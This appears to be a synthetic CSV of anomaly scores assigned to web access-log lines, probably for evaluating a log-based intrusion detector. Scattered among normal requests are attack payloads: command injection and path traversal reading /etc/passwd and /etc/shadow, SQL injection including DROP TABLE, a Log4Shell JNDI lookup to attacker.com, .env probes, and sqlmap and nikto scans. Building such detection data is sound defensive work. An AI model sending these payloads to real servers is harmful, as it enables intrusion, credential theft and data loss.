score_content,score_session,score_fused,score_fused_norm,line
1.8918445110321045,,1.8918445110321045,1.8918445110321045,136.76.117.130 - - [10/Jan/2025:12:00:25 +0000] "GET /dashboard HTTP/1.1" 200 19675 "https://news.ycombinator.com/" "python-requests/2.31.0"
30112.1171875,,30112.1171875,30112.1171875,225.197.142.185 - - [10/Jan/2025:12:00:25 +0000] "GET /contact HTTP/1.1" 401 1333 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.62128257751465,,23.62128257751465,23.62128257751465,103.107.187.25 - - [10/Jan/2025:12:00:28 +0000] "GET /search?q=phone HTTP/1.1" 200 14960 "https://news.ycombinator.com/" "curl/7.68.0"
30113.380859375,,30113.380859375,30113.380859375,237.122.18.24 - - [10/Jan/2025:12:00:30 +0000] "GET /profile HTTP/1.1" 429 1406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.551036834716797,,26.551036834716797,26.551036834716797,16.151.245.144 - - [10/Jan/2025:12:00:33 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 18331 "-" "sqlmap/1.5.10#stable"
30134.345703125,,30134.345703125,30134.345703125,14.248.74.154 - - [10/Jan/2025:12:00:36 +0000] "GET /search?q=phone HTTP/1.1" 403 1476 "https://example.com/" "curl/7.68.0"
1.8626922369003296,,1.8626922369003296,1.8626922369003296,58.217.28.90 - - [10/Jan/2025:12:00:36 +0000] "GET /api/products HTTP/1.1" 200 15900 "https://example.com/" "python-requests/2.31.0"
26.611583709716797,,26.611583709716797,26.611583709716797,250.197.210.160 - - [10/Jan/2025:12:00:36 +0000] "GET /api/product?id=123 HTTP/1.1" 304 18481 "https://twitter.com/" "python-requests/2.31.0"
1.9909504652023315,,1.9909504652023315,1.9909504652023315,180.196.80.236 - - [10/Jan/2025:12:00:36 +0000] "GET /login HTTP/1.1" 200 9054 "https://example.com/" "curl/7.68.0"
0.24193143844604492,,0.24193143844604492,0.24193143844604492,18.37.190.163 - - [10/Jan/2025:12:00:36 +0000] "GET /assets/app.css HTTP/1.1" 200 13232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.586101531982422,,23.586101531982422,23.586101531982422,41.95.80.185 - - [10/Jan/2025:12:00:41 +0000] "GET /search?q=laptop HTTP/1.1" 200 11270 "https://twitter.com/" "curl/7.68.0"
0.2393704503774643,,0.2393704503774643,0.2393704503774643,173.21.70.114 - - [10/Jan/2025:12:00:45 +0000] "GET /wp-login.php HTTP/1.1" 200 1730 "https://news.ycombinator.com/" "dirb/2.22"
2.0204203128814697,,2.0204203128814697,2.0204203128814697,30.89.111.29 - - [10/Jan/2025:12:00:49 +0000] "GET /login HTTP/1.1" 200 16888 "https://twitter.com/" "curl/7.68.0"
1.9703400135040283,,1.9703400135040283,1.9703400135040283,253.154.15.2 - - [10/Jan/2025:12:00:52 +0000] "GET /logout HTTP/1.1" 200 13051 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.96608304977417,,1.96608304977417,1.96608304977417,2.128.192.111 - - [10/Jan/2025:12:00:53 +0000] "GET /login HTTP/1.1" 200 4031 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.59984016418457,,23.59984016418457,23.59984016418457,19.102.221.190 - - [10/Jan/2025:12:00:56 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11705 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.181640625,,30112.181640625,30112.181640625,110.147.104.182 - - [10/Jan/2025:12:00:56 +0000] "GET /about HTTP/1.1" 401 1179 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
11044.2861328125,,11044.2861328125,11044.2861328125,206.243.159.118 - - [10/Jan/2025:12:00:58 +0000] "GET /admin HTTP/1.1" 500 351 "-" "sqlmap/1.5.10#stable"
23.605588912963867,,23.605588912963867,23.605588912963867,135.21.102.223 - - [10/Jan/2025:12:01:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 13221 "https://example.com/" "curl/7.68.0"
0.22283777594566345,,0.22283777594566345,0.22283777594566345,136.131.50.232 - - [10/Jan/2025:12:01:02 +0000] "GET /assets/app.js HTTP/1.1" 200 3836 "https://example.com/" "curl/7.68.0"
0.20505458116531372,,0.20505458116531372,0.20505458116531372,66.51.45.155 - - [10/Jan/2025:12:01:07 +0000] "GET /assets/app.css HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.54218292236328,,23.54218292236328,23.54218292236328,195.149.115.175 - - [10/Jan/2025:12:01:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 18572 "https://twitter.com/" "python-requests/2.31.0"
1.8206499814987183,,1.8206499814987183,1.8206499814987183,121.114.162.78 - - [10/Jan/2025:12:01:10 +0000] "GET /dashboard HTTP/1.1" 200 2337 "https://twitter.com/" "curl/7.68.0"
2.0138089656829834,,2.0138089656829834,2.0138089656829834,10.15.95.213 - - [10/Jan/2025:12:01:10 +0000] "GET /about HTTP/1.1" 200 14908 "-" "curl/7.68.0"
2.0181353092193604,,2.0181353092193604,2.0181353092193604,99.119.149.142 - - [10/Jan/2025:12:01:15 +0000] "GET /about HTTP/1.1" 201 16715 "-" "sqlmap/1.5.10#stable"
1.8619694709777832,,1.8619694709777832,1.8619694709777832,129.39.246.16 - - [10/Jan/2025:12:01:18 +0000] "GET /api/products HTTP/1.1" 200 15685 "-" "Wget/1.20.3 (linux-gnu)"
1.975148320198059,,1.975148320198059,1.975148320198059,11.64.182.113 - - [10/Jan/2025:12:01:20 +0000] "GET /about HTTP/1.1" 200 5754 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.9203541278839111,,1.9203541278839111,1.9203541278839111,100.105.199.87 - - [10/Jan/2025:12:01:24 +0000] "GET /profile HTTP/1.1" 200 9369 "https://twitter.com/" "sqlmap/1.5.10#stable"
1.8245314359664917,,1.8245314359664917,1.8245314359664917,143.174.99.73 - - [10/Jan/2025:12:01:24 +0000] "GET /dashboard HTTP/1.1" 200 3196 "https://twitter.com/" "curl/7.68.0"
30110.880859375,,30110.880859375,30110.880859375,248.168.179.170 - - [10/Jan/2025:12:01:25 +0000] "GET /assets/app.css HTTP/1.1" 404 635 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.0048677921295166,,2.0048677921295166,2.0048677921295166,165.203.85.209 - - [10/Jan/2025:12:01:29 +0000] "GET /about HTTP/1.1" 200 12443 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.572587966918945,,23.572587966918945,23.572587966918945,93.80.47.244 - - [10/Jan/2025:12:01:29 +0000] "GET /search?q=phone HTTP/1.1" 200 697 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22833837568759918,,0.22833837568759918,0.22833837568759918,217.202.26.130 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 9792 "https://twitter.com/" "python-requests/2.31.0"
0.20638741552829742,,0.20638741552829742,0.20638741552829742,42.47.213.178 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 5154 "https://www.google.com/" "python-requests/2.31.0"
23.593040466308594,,23.593040466308594,23.593040466308594,249.114.157.73 - - [10/Jan/2025:12:01:37 +0000] "GET /search?q=phone HTTP/1.1" 200 7883 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
11044.228515625,,11044.228515625,11044.228515625,232.214.50.95 - - [10/Jan/2025:12:01:38 +0000] "GET /logout HTTP/1.1" 500 960 "https://twitter.com/" "sqlmap/1.5.10#stable"
4.9619574546813965,,4.9619574546813965,4.9619574546813965,136.108.248.42 - - [10/Jan/2025:12:01:41 +0000] "GET /logout HTTP/1.1" 304 16579 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.34001094102859497,,0.34001094102859497,0.34001094102859497,142.240.27.183 - - [10/Jan/2025:12:01:42 +0000] "GET /index.html HTTP/1.1" 201 12263 "-" "python-requests/2.31.0"
0.12844018638134003,,0.12844018638134003,0.12844018638134003,38.213.112.24 - - [10/Jan/2025:12:01:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 16921 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.62660026550293,,23.62660026550293,23.62660026550293,96.61.99.21 - - [10/Jan/2025:12:01:46 +0000] "GET /search?q=phone HTTP/1.1" 200 16549 "https://www.google.com/" "curl/7.68.0"
30112.07421875,,30112.07421875,30112.07421875,86.203.38.36 - - [10/Jan/2025:12:01:46 +0000] "GET /contact HTTP/1.1" 400 1331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.186453104019165,,3.186453104019165,3.186453104019165,115.158.2.232 - - [10/Jan/2025:12:01:49 +0000] "GET /assets/app.css HTTP/1.1" 302 15471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2561023533344269,,0.2561023533344269,0.2561023533344269,109.29.199.74 - - [10/Jan/2025:12:01:51 +0000] "GET /assets/app.css HTTP/1.1" 200 17394 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7651715278625488,,1.7651715278625488,1.7651715278625488,17.29.215.232 - - [10/Jan/2025:12:01:51 +0000] "GET /server-status HTTP/1.1" 201 15078 "https://twitter.com/" "nikto/2.5.0"
26.40960693359375,,26.40960693359375,26.40960693359375,110.1.158.91 - - [10/Jan/2025:12:01:55 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 9644 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.0028390884399414,,2.0028390884399414,2.0028390884399414,18.245.135.140 - - [10/Jan/2025:12:01:58 +0000] "GET /about HTTP/1.1" 200 11916 "https://twitter.com/" "python-requests/2.31.0"
23.863182067871094,,23.863182067871094,23.863182067871094,252.96.65.192 - - [10/Jan/2025:12:02:02 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 12777 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.906705856323242,,4.906705856323242,4.906705856323242,35.12.91.140 - - [10/Jan/2025:12:02:02 +0000] "GET /contact HTTP/1.1" 304 10995 "https://www.google.com/" "curl/7.68.0"
23.483678817749023,,23.483678817749023,23.483678817749023,17.184.199.242 - - [10/Jan/2025:12:02:07 +0000] "GET /search?q=headphones HTTP/1.1" 201 4518 "-" "Wget/1.20.3 (linux-gnu)"
30112.142578125,,30112.142578125,30112.142578125,239.80.132.102 - - [10/Jan/2025:12:02:09 +0000] "GET /api/products HTTP/1.1" 403 646 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.416259765625,,23.416259765625,23.416259765625,222.168.85.70 - - [10/Jan/2025:12:02:11 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 1666 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30134.34375,,30134.34375,30134.34375,87.250.48.128 - - [10/Jan/2025:12:02:14 +0000] "GET /search?q=camera HTTP/1.1" 403 791 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.989957809448242,,4.989957809448242,4.989957809448242,21.111.155.211 - - [10/Jan/2025:12:02:16 +0000] "GET /login HTTP/1.1" 304 14010 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.994144082069397,,1.994144082069397,1.994144082069397,79.115.155.184 - - [10/Jan/2025:12:02:18 +0000] "GET /about HTTP/1.1" 200 9787 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
23.587610244750977,,23.587610244750977,23.587610244750977,158.112.71.164 - - [10/Jan/2025:12:02:23 +0000] "GET /search?q=camera HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9010356664657593,,1.9010356664657593,1.9010356664657593,244.8.37.218 - - [10/Jan/2025:12:02:28 +0000] "GET /profile HTTP/1.1" 200 5342 "https://news.ycombinator.com/" "python-requests/2.31.0"
26.460102081298828,,26.460102081298828,26.460102081298828,93.99.244.146 - - [10/Jan/2025:12:02:28 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 12103 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8870304822921753,,1.8870304822921753,1.8870304822921753,147.36.136.94 - - [10/Jan/2025:12:02:29 +0000] "GET /profile HTTP/1.1" 200 2619 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.9054232835769653,,1.9054232835769653,1.9054232835769653,128.133.100.234 - - [10/Jan/2025:12:02:34 +0000] "GET /contact HTTP/1.1" 200 6196 "-" "python-requests/2.31.0"
23.578575134277344,,23.578575134277344,23.578575134277344,178.235.126.52 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 200 9457 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11066.49609375,,11066.49609375,11066.49609375,248.217.253.82 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 503 1396 "https://example.com/" "sqlmap/1.5.10#stable"
30134.376953125,,30134.376953125,30134.376953125,183.182.238.180 - - [10/Jan/2025:12:02:41 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 403 322 "https://example.com/" "curl/7.68.0"
4.812046051025391,,4.812046051025391,4.812046051025391,203.127.7.93 - - [10/Jan/2025:12:02:45 +0000] "GET /api/products HTTP/1.1" 304 7857 "https://twitter.com/" "python-requests/2.31.0"
0.19495755434036255,,0.19495755434036255,0.19495755434036255,17.80.102.184 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 2925 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30134.310546875,,30134.310546875,30134.310546875,33.249.82.165 - - [10/Jan/2025:12:02:51 +0000] "GET /search?q=phone HTTP/1.1" 400 151 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.952529788017273,,1.952529788017273,1.952529788017273,164.151.47.197 - - [10/Jan/2025:12:02:54 +0000] "GET /profile HTTP/1.1" 200 18165 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30110.7734375,,30110.7734375,30110.7734375,40.78.43.42 - - [10/Jan/2025:12:02:58 +0000] "GET /index.html HTTP/1.1" 400 1061 "https://www.google.com/" "curl/7.68.0"
30112.1328125,,30112.1328125,30112.1328125,51.163.245.142 - - [10/Jan/2025:12:03:00 +0000] "GET /logout HTTP/1.1" 400 513 "https://www.google.com/" "curl/7.68.0"
1.9744834899902344,,1.9744834899902344,1.9744834899902344,152.242.149.40 - - [10/Jan/2025:12:03:05 +0000] "GET /about HTTP/1.1" 200 5625 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.0234375,,30112.0234375,30112.0234375,11.212.222.8 - - [10/Jan/2025:12:03:10 +0000] "GET /dashboard HTTP/1.1" 400 1154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.020925283432007,,2.020925283432007,2.020925283432007,107.159.164.8 - - [10/Jan/2025:12:03:15 +0000] "GET /login HTTP/1.1" 204 18847 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.971652865409851,,1.971652865409851,1.971652865409851,77.117.19.177 - - [10/Jan/2025:12:03:17 +0000] "GET /logout HTTP/1.1" 200 13406 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.615638732910156,,23.615638732910156,23.615638732910156,37.81.221.184 - - [10/Jan/2025:12:03:20 +0000] "GET /search?q=camera HTTP/1.1" 200 19979 "https://example.com/" "curl/7.68.0"
23.501750946044922,,23.501750946044922,23.501750946044922,82.62.120.32 - - [10/Jan/2025:12:03:23 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3579 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2882719337940216,,0.2882719337940216,0.2882719337940216,222.158.108.64 - - [10/Jan/2025:12:03:24 +0000] "GET /wp-login.php HTTP/1.1" 200 12687 "https://example.com/" "curl/7.68.0"
4.804754734039307,,4.804754734039307,4.804754734039307,132.120.128.226 - - [10/Jan/2025:12:03:28 +0000] "GET /api/products HTTP/1.1" 302 16427 "https://news.ycombinator.com/" "curl/7.68.0"
0.5294713973999023,,0.5294713973999023,0.5294713973999023,56.150.91.13 - - [10/Jan/2025:12:03:28 +0000] "GET /.env HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.499237060546875,,23.499237060546875,23.499237060546875,217.28.111.35 - - [10/Jan/2025:12:03:31 +0000] "GET /search?q=headphones HTTP/1.1" 200 367 "https://example.com/" "curl/7.68.0"
23.611255645751953,,23.611255645751953,23.611255645751953,50.93.142.74 - - [10/Jan/2025:12:03:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 18509 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.13671875,,30112.13671875,30112.13671875,175.157.31.33 - - [10/Jan/2025:12:03:38 +0000] "GET /login HTTP/1.1" 400 1276 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8662502765655518,,1.8662502765655518,1.8662502765655518,194.37.51.155 - - [10/Jan/2025:12:03:40 +0000] "GET /dashboard HTTP/1.1" 200 12080 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2817588150501251,,0.2817588150501251,0.2817588150501251,206.122.133.117 - - [10/Jan/2025:12:03:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11013 "https://twitter.com/" "curl/7.68.0"
23.617494583129883,,23.617494583129883,23.617494583129883,152.87.130.213 - - [10/Jan/2025:12:03:48 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9905 "https://twitter.com/" "nikto/2.5.0"
2.1736669540405273,,2.1736669540405273,2.1736669540405273,251.107.150.79 - - [10/Jan/2025:12:03:50 +0000] "GET / HTTP/1.1" 200 3691 "-" "sqlmap/1.5.10#stable"
26.57322883605957,,26.57322883605957,26.57322883605957,123.44.135.162 - - [10/Jan/2025:12:03:54 +0000] "GET /api/product?id=123 HTTP/1.1" 302 19220 "https://twitter.com/" "sqlmap/1.5.10#stable"
23.432811737060547,,23.432811737060547,23.432811737060547,49.5.113.81 - - [10/Jan/2025:12:03:57 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3701 "https://www.google.com/" "dirb/2.22"
23.62330436706543,,23.62330436706543,23.62330436706543,224.218.189.187 - - [10/Jan/2025:12:04:00 +0000] "GET /search?q=phone HTTP/1.1" 200 15553 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11044.3203125,,11044.3203125,11044.3203125,135.97.81.245 - - [10/Jan/2025:12:04:04 +0000] "GET /dashboard HTTP/1.1" 503 979 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.836676120758057,,4.836676120758057,4.836676120758057,157.124.50.246 - - [10/Jan/2025:12:04:08 +0000] "GET /profile HTTP/1.1" 301 8762 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.923577785491943,,4.923577785491943,4.923577785491943,177.181.126.82 - - [10/Jan/2025:12:04:12 +0000] "GET /logout HTTP/1.1" 304 6892 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.0266709327697754,,2.0266709327697754,2.0266709327697754,174.140.98.230 - - [10/Jan/2025:12:04:16 +0000] "GET /login HTTP/1.1" 200 18891 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30113.5,,30113.5,30113.5,89.237.114.168 - - [10/Jan/2025:12:04:17 +0000] "GET /logout HTTP/1.1" 429 161 "https://news.ycombinator.com/" "curl/7.68.0"
30112.3046875,,30112.3046875,30112.3046875,70.36.28.158 - - [10/Jan/2025:12:04:18 +0000] "GET /login HTTP/1.1" 404 1425 "https://twitter.com/" "sqlmap/1.5.10#stable"
23.55305290222168,,23.55305290222168,23.55305290222168,26.106.85.184 - - [10/Jan/2025:12:04:19 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1820 "-" "Wget/1.20.3 (linux-gnu)"
11044.4912109375,,11044.4912109375,11044.4912109375,105.168.240.226 - - [10/Jan/2025:12:04:24 +0000] "GET / HTTP/1.1" 500 323 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.9200152158737183,,1.9200152158737183,1.9200152158737183,233.197.23.167 - - [10/Jan/2025:12:04:29 +0000] "GET /logout HTTP/1.1" 200 2038 "https://www.google.com/" "python-requests/2.31.0"
30110.982421875,,30110.982421875,30110.982421875,107.226.215.46 - - [10/Jan/2025:12:04:33 +0000] "GET /index.html HTTP/1.1" 404 358 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.5078125,,30112.5078125,30112.5078125,77.146.155.28 - - [10/Jan/2025:12:04:36 +0000] "GET /logout HTTP/1.1" 403 18 "https://example.com/" "curl/7.68.0"
30134.337890625,,30134.337890625,30134.337890625,218.130.120.70 - - [10/Jan/2025:12:04:39 +0000] "GET /search?q=headphones HTTP/1.1" 403 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.55755043029785,,23.55755043029785,23.55755043029785,4.189.87.203 - - [10/Jan/2025:12:04:41 +0000] "GET /search?q=camera HTTP/1.1" 204 6201 "https://twitter.com/" "curl/7.68.0"
0.26584121584892273,,0.26584121584892273,0.26584121584892273,212.110.132.84 - - [10/Jan/2025:12:04:46 +0000] "GET /assets/app.js HTTP/1.1" 200 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.17980855703353882,,0.17980855703353882,0.17980855703353882,2.67.99.61 - - [10/Jan/2025:12:04:51 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8228 "https://example.com/" "nikto/2.5.0"
2.211974620819092,,2.211974620819092,2.211974620819092,178.61.16.171 - - [10/Jan/2025:12:04:53 +0000] "GET / HTTP/1.1" 200 11881 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.876125812530518,,4.876125812530518,4.876125812530518,95.158.57.57 - - [10/Jan/2025:12:04:55 +0000] "GET /logout HTTP/1.1" 301 9767 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
